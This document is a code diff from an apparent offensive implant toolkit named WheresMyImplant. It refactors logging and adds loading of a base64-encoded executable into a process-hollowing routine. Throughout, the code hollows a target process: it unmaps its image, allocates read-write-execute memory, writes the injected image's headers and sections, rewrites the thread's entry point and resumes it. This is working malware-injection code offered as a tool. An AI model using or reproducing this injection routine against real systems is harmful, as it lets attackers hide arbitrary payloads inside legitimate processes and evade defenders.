@@ -66,10 +66,11 @@ namespace WheresMyImplant
                 return false;
             }
 
-            Console.WriteLine("Started Process: {0}", lpProcessInformation.dwProcessId);
-            Console.WriteLine("Started Thread:  {0}", lpProcessInformation.dwThreadId);
-            Console.WriteLine("Recieved Handle: 0x{0}", lpProcessInformation.hProcess.ToString("X4"));
-            return true;
+            WriteOutputGood(String.Format("Started Process: {0}", lpProcessInformation.dwProcessId));
+            WriteOutputGood(String.Format("Started Thread:  {0}", lpProcessInformation.dwThreadId));
+            WriteOutputGood(String.Format("Recieved Handle: 0x{0}", lpProcessInformation.hProcess.ToString("X4")));
+
+            return ReadPEB();
         }
 
         ////////////////////////////////////////////////////////////////////////////////
@@ -98,9 +99,9 @@ namespace WheresMyImplant
                 }
                 processBasicInformation = (ntdll._PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(processInformation, typeof(ntdll._PROCESS_BASIC_INFORMATION));
             }
-            catch (Exception error)
+            catch (Exception)
             {
-                Console.WriteLine(error);
+                WriteOutputBad("ReadPEB Failed");
                 return false;
             }
             finally
@@ -109,7 +110,7 @@ namespace WheresMyImplant
             }
 
             ////////////////////////////////////////////////////////////////////////////////
-            Console.WriteLine("PEB Base Address:   0x{0}", processBasicInformation.PebBaseAddress.ToString("X4"));
+            WriteOutputNeutral(String.Format("PEB Base Address:   0x{0}", processBasicInformation.PebBaseAddress.ToString("X4")));
             Winternl._PEB64 peb;
             UInt32 pebSize = (UInt32)Marshal.SizeOf(typeof(Winternl._PEB64));
             IntPtr buffer = Marshal.AllocHGlobal((Int32)pebSize);
@@ -127,18 +128,19 @@ namespace WheresMyImplant
                 }
                 peb = (Winternl._PEB64)Marshal.PtrToStructure(buffer, typeof(Winternl._PEB64));
                 targetImageBaseAddress = peb.ImageBaseAddress;
-                Console.WriteLine("Image Base Address: 0x{0}", targetImageBaseAddress.ToString("X4"));
+                WriteOutputNeutral(String.Format("Image Base Address: 0x{0}", targetImageBaseAddress.ToString("X4")));
             }
             catch (Exception error)
             {
-                Console.WriteLine(error);
+                WriteOutputBad("ReadPEB Failed");
                 return false;
             }
             finally
             {
                 Marshal.FreeHGlobal(buffer);
             }
-            return true;
+
+            return GetTargetArch();
         }
 
         ////////////////////////////////////////////////////////////////////////////////
@@ -148,25 +150,31 @@ namespace WheresMyImplant
         {
             Winbase._SYSTEM_INFO systemInfo;
             kernel32.GetNativeSystemInfo(out systemInfo);
-            Console.WriteLine(systemInfo.wProcessorArchitecture);
+            //Console.WriteLine(systemInfo.wProcessorArchitecture);
             if (Winbase.INFO_PROCESSOR_ARCHITECTURE.PROCESSOR_ARCHITECTURE_INTEL == systemInfo.wProcessorArchitecture)
             {
                 is32Bit = true;
-                return true;
             }
-
+            /*
             if (!kernel32.IsWow64Process(lpProcessInformation.hProcess, out is32Bit))
             {
+                WriteOutputBad("IsWow64Process Failed");
                 return false;
             }
-            return true;
+            */
+            return GetContext();
         }
 
         ////////////////////////////////////////////////////////////////////////////////
         ////////////////////////////////////////////////////////////////////////////////
         internal Boolean GetContext()
         {
-            return is32Bit ? GetContext32() : GetContext64();
+            if (!(is32Bit ? GetContext32() : GetContext64()))
+            {
+                return false;
+            }
+
+            return ReadNTHeaders();
         }
 
         ////////////////////////////////////////////////////////////////////////////////
@@ -181,7 +189,7 @@ namespace WheresMyImplant
             {
                 Marshal.StructureToPtr(context32, lpContext, false);
 
-                Console.WriteLine("\nGetting Thread Context");
+                WriteOutputNeutral("Getting Thread Context");
                 kernel32.GetThreadContext(lpProcessInformation.hThread, lpContext);
 
                 context32 = (Winnt.CONTEXT)Marshal.PtrToStructure(lpContext, typeof(Winnt.CONTEXT64));
@@ -190,7 +198,7 @@ namespace WheresMyImplant
             {
                 if (error is ArgumentException || error is ArgumentNullException)
                 {
-                    Console.WriteLine("Get Thread Context Failed");
+                    WriteOutputBad("GetThreadContext Failed");
                 }
             }
             finally
@@ -198,8 +206,8 @@ namespace WheresMyImplant
                 Marshal.FreeHGlobal(lpContext);
             }
 
-            Console.WriteLine("EAX Address: 0x{0}", context32.Eax.ToString("X4"));
-            Console.WriteLine("EBX Address: 0x{0}", context32.Ebx.ToString("X4"));
+            WriteOutputNeutral(String.Format("EAX Address: 0x{0}", context32.Eax.ToString("X4")));
+            WriteOutputNeutral(String.Format("EBX Address: 0x{0}", context32.Ebx.ToString("X4")));
             return true;
         }
 
@@ -215,7 +223,7 @@ namespace WheresMyImplant
             {
                 Marshal.StructureToPtr(context64, lpContext, false);
 
-                Console.WriteLine("\nGetting Thread Context");
+                WriteOutputNeutral("Getting Thread Context");
                 kernel32.GetThreadContext(lpProcessInformation.hThread, lpContext);
 
                 context64 = (Winnt.CONTEXT64)Marshal.PtrToStructure(lpContext, typeof(Winnt.CONTEXT64));
@@ -228,8 +236,8 @@ namespace WheresMyImplant
                 Marshal.FreeHGlobal(lpContext);
             }
 
-            Console.WriteLine("RCX Address: 0x{0}", context64.Rcx.ToString("X4"));
-            Console.WriteLine("RDX Address: 0x{0}", context64.Rdx.ToString("X4"));
+            WriteOutputNeutral(String.Format("RCX Address: 0x{0}", context64.Rcx.ToString("X4")));
+            WriteOutputNeutral(String.Format("RDX Address: 0x{0}", context64.Rdx.ToString("X4")));
             return true;
         }
 
@@ -258,7 +266,7 @@ namespace WheresMyImplant
                         return false;
                     }
                 }
-                catch
+                catch (Exception)
                 {
                     return false;
                 }
@@ -286,7 +294,7 @@ namespace WheresMyImplant
                         return false;
                     }
                 }
-                catch
+                catch (Exception)
                 {
                     return false;
                 }
@@ -295,7 +303,7 @@ namespace WheresMyImplant
                     Marshal.FreeHGlobal(buffer);
                 }
                 targetNTHeader64 = (Winnt._IMAGE_NT_HEADERS64)Marshal.PtrToStructure(buffer, typeof(Winnt._IMAGE_NT_HEADERS64));
-                Console.WriteLine(targetNTHeader64.FileHeader.Machine);
+                //Console.WriteLine(targetNTHeader64.FileHeader.Machine);
                 return true;
             }
         }
@@ -303,12 +311,12 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         // Reads in the image to be injected
         ////////////////////////////////////////////////////////////////////////////////
-        internal Boolean ReadSourceImage(String sourceImage)
+        internal Boolean ReadSourceImageFile(String sourceImage)
         {
             String file = System.IO.Path.GetFullPath(sourceImage);
             if (!System.IO.File.Exists(file))
             {
-                Console.WriteLine("File Not Found");
+                WriteOutputBad("File Not Found");
                 return false;
             }
 
@@ -332,15 +340,39 @@ namespace WheresMyImplant
         }
 
         ////////////////////////////////////////////////////////////////////////////////
+        // Reads in the image to be injected
+        ////////////////////////////////////////////////////////////////////////////////
+        internal Boolean ReadSourceImageString(String sourceImage)
+        {
+            image = System.Convert.FromBase64String(sourceImage);
+            pinnedArray = GCHandle.Alloc(image, GCHandleType.Pinned);
+            imagePtr = pinnedArray.AddrOfPinnedObject();
+
+            imageDosHeader = (Winnt._IMAGE_DOS_HEADER)Marshal.PtrToStructure(imagePtr, typeof(Winnt._IMAGE_DOS_HEADER));
+            IntPtr ntHeaderPtr = new IntPtr(imagePtr.ToInt64() + imageDosHeader.e_lfanew);
+            imageFileHeader = (Winnt._IMAGE_FILE_HEADER)Marshal.PtrToStructure(new IntPtr(ntHeaderPtr.ToInt64() + sizeof(UInt32)), typeof(Winnt._IMAGE_FILE_HEADER));
+            if (is32Bit)
+            {
+                imageNTHeader = (Winnt._IMAGE_NT_HEADERS)Marshal.PtrToStructure(ntHeaderPtr, typeof(Winnt._IMAGE_NT_HEADERS));
+                return true;
+            }
+            else
+            {
+                imageNTHeader64 = (Winnt._IMAGE_NT_HEADERS64)Marshal.PtrToStructure(ntHeaderPtr, typeof(Winnt._IMAGE_NT_HEADERS64));
+                return true;
+            }
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
         // Todo Fix the Page_Execute_Read_Write
         ////////////////////////////////////////////////////////////////////////////////
         internal Boolean RemapImage()
         {
-            Console.WriteLine("NtUnmapViewOfSection: 0x{0}", targetImageBaseAddress.ToString("X4"));
+            WriteOutputNeutral(String.Format("NtUnmapViewOfSection: 0x{0}", targetImageBaseAddress.ToString("X4")));
             UInt32 result = ntdll.NtUnmapViewOfSection(lpProcessInformation.hProcess, targetImageBaseAddress);
             if (0 != result)
             {
-                Console.WriteLine("NtUnmapViewOfSection Failed");
+                WriteOutputBad("NtUnmapViewOfSection Failed");
                 return false;
             }
 
@@ -351,19 +383,19 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         internal Boolean RemapImage32()
         {
-            Console.WriteLine("Allocating 0x{0} bytes at 0x{1} - 0x{2}", image.Length.ToString("X4"), targetImageBaseAddress.ToString("X4"), (image.Length + targetImageBaseAddress.ToInt64()).ToString("X4"));
+            WriteOutputNeutral(String.Format("Allocating 0x{0} bytes at 0x{1} - 0x{2}", image.Length.ToString("X4"), targetImageBaseAddress.ToString("X4"), (image.Length + targetImageBaseAddress.ToInt64()).ToString("X4")));
             //allocatedTargetAddress = kernel32.VirtualAllocEx(lpProcessInformation.hProcess, targetImageBaseAddress, imageNTHeader.OptionalHeader.SizeOfImage, 0x00003000, Winnt.PAGE_EXECUTE_READWRITE);
             allocatedTargetAddress = kernel32.VirtualAllocEx(lpProcessInformation.hProcess, new IntPtr((Int64)imageNTHeader.OptionalHeader.ImageBase), imageNTHeader.OptionalHeader.SizeOfImage, 0x00003000, Winnt.PAGE_EXECUTE_READWRITE);
             if (IntPtr.Zero == allocatedTargetAddress)
             {
-                Console.WriteLine("VirtualAllocEx failed");
+                WriteOutputBad("VirtualAllocEx failed");
                 return false;
             }
 
             ////////////////////////////////////////////////////////////////////////////////
-            Console.WriteLine("\nFinding Source Image Base");
+            WriteOutputNeutral("\nFinding Source Image Base");
             //UInt64 imageBase = (UInt64)Marshal.ReadInt64(imagePtr, (Int32)imageDosHeader.e_lfanew + offset1 + offset2 + offset3);
-            Console.WriteLine("Source Image Base: 0x{0}", imageNTHeader.OptionalHeader.ImageBase.ToString("X4"));
+            WriteOutputNeutral(String.Format("Source Image Base: 0x{0}", imageNTHeader.OptionalHeader.ImageBase.ToString("X4")));
 
             ////////////////////////////////////////////////////////////////////////////////
             UInt32 bytesWritten = 0;
@@ -376,7 +408,7 @@ namespace WheresMyImplant
             {
                 return false;
             }
-            Console.WriteLine("Headers Copied: {0} of {1} bytes", bytesWritten, imageNTHeader.OptionalHeader.SizeOfHeaders);
+            WriteOutputGood(String.Format("Headers Copied: {0} of {1} bytes", bytesWritten, imageNTHeader.OptionalHeader.SizeOfHeaders));
 
             ////////////////////////////////////////////////////////////////////////////////
             for (Int32 i = 0; i < imageNTHeader64.FileHeader.NumberOfSections; i++)
@@ -388,7 +420,7 @@ namespace WheresMyImplant
                     (Marshal.SizeOf(typeof(Winnt._IMAGE_SECTION_HEADER)) * i));
                 Winnt._IMAGE_SECTION_HEADER imageSectionHeader = (Winnt._IMAGE_SECTION_HEADER)Marshal.PtrToStructure(offset, typeof(Winnt._IMAGE_SECTION_HEADER));
 
-                Console.WriteLine("Writing Section {0}", new String(imageSectionHeader.Name));
+                WriteOutputGood(String.Format("Writing Section {0}", new String(imageSectionHeader.Name)));
                 bytesWritten = 0;
                 if (!kernel32.WriteProcessMemory(
                     lpProcessInformation.hProcess,
@@ -409,22 +441,22 @@ namespace WheresMyImplant
         internal Boolean RemapImage64()
         {
             ////////////////////////////////////////////////////////////////////////////////
-            Console.WriteLine("Allocating 0x{0} bytes at 0x{1} - 0x{2}", image.Length.ToString("X4"), targetImageBaseAddress.ToString("X4"), (image.Length + targetImageBaseAddress.ToInt64()).ToString("X4"));
+            WriteOutputNeutral(String.Format("Allocating 0x{0} bytes at 0x{1} - 0x{2}", image.Length.ToString("X4"), targetImageBaseAddress.ToString("X4"), (image.Length + targetImageBaseAddress.ToInt64()).ToString("X4")));
             allocatedTargetAddress = kernel32.VirtualAllocEx(lpProcessInformation.hProcess, new IntPtr((Int64)imageNTHeader64.OptionalHeader.ImageBase), imageNTHeader64.OptionalHeader.SizeOfImage, 0x00003000, Winnt.PAGE_EXECUTE_READWRITE);
             if (IntPtr.Zero == allocatedTargetAddress)
             {
-                Console.WriteLine("VirtualAllocEx failed");
+                WriteOutputBad("VirtualAllocEx failed");
                 return false;
             }
 
-            Console.WriteLine("Source Image Base: 0x{0}", imageNTHeader64.OptionalHeader.ImageBase.ToString("X4"));
+            WriteOutputNeutral(String.Format("Source Image Base: 0x{0}", imageNTHeader64.OptionalHeader.ImageBase.ToString("X4")));
             ////////////////////////////////////////////////////////////////////////////////
             UInt32 bytesWritten = 0;
             if (!kernel32.WriteProcessMemory(lpProcessInformation.hProcess, allocatedTargetAddress, imagePtr, imageNTHeader64.OptionalHeader.SizeOfHeaders, ref bytesWritten))
             {
                 return false;
             }
-            Console.WriteLine("Headers Copied: {0} of {1} bytes", bytesWritten, imageNTHeader64.OptionalHeader.SizeOfHeaders);
+            WriteOutputGood(String.Format("Headers Copied: {0} of {1} bytes", bytesWritten, imageNTHeader64.OptionalHeader.SizeOfHeaders));
 
             ////////////////////////////////////////////////////////////////////////////////
             for (Int32 i = 0; i < imageNTHeader64.FileHeader.NumberOfSections; i++)
@@ -436,7 +468,7 @@ namespace WheresMyImplant
                     (Marshal.SizeOf(typeof(Winnt._IMAGE_SECTION_HEADER)) * i));
                 Winnt._IMAGE_SECTION_HEADER imageSectionHeader = (Winnt._IMAGE_SECTION_HEADER)Marshal.PtrToStructure(offset, typeof(Winnt._IMAGE_SECTION_HEADER));
 
-                Console.WriteLine("Writing Section {0}", new String(imageSectionHeader.Name));
+                WriteOutputGood(String.Format("Writing Section {0}", new String(imageSectionHeader.Name)));
                 bytesWritten = 0;
                 if (!kernel32.WriteProcessMemory(lpProcessInformation.hProcess, new IntPtr(allocatedTargetAddress.ToInt64() + imageSectionHeader.VirtualAddress), new IntPtr(imagePtr.ToInt64() + imageSectionHeader.PointerToRawData), (UInt32)imageSectionHeader.SizeOfRawData, ref bytesWritten))
                 {
@@ -449,9 +481,9 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         //
         ////////////////////////////////////////////////////////////////////////////////
-        internal Boolean ResumeProcess()
+        internal Boolean ResumeProcess(Boolean bWait)
         {
-            return is32Bit ? ResumeProcess32() : ResumeProcess64(false);
+            return is32Bit ? ResumeProcess32() : ResumeProcess64(bWait);
         }
 
         ////////////////////////////////////////////////////////////////////////////////
@@ -475,10 +507,10 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         internal Boolean ResumeProcess64(Boolean wait)
         {
-            Console.WriteLine("\nUpdating Thread Context");
+            WriteOutputNeutral(String.Format("Updating Thread Context"));
 
             context64.Rcx = (UInt64)allocatedTargetAddress.ToInt64() + imageNTHeader64.OptionalHeader.AddressOfEntryPoint;
-            Console.WriteLine("Updated Entry Point Address: 0x{0}", context64.Rcx.ToString("X4"));
+            WriteOutputGood(String.Format("Updated Entry Point Address: 0x{0}", context64.Rcx.ToString("X4")));
             
             //Updates the PEB
             UInt32 bytesWritten = 0;
@@ -491,7 +523,7 @@ namespace WheresMyImplant
             Marshal.StructureToPtr(context64, lpContext, false);
             kernel32.SetThreadContext(lpProcessInformation.hThread, lpContext);
 
-            Console.WriteLine("Resuming Main Thread");
+            WriteOutputNeutral("Resuming Main Thread");
             kernel32.ResumeThread(lpProcessInformation.hThread);
 
             if (wait)
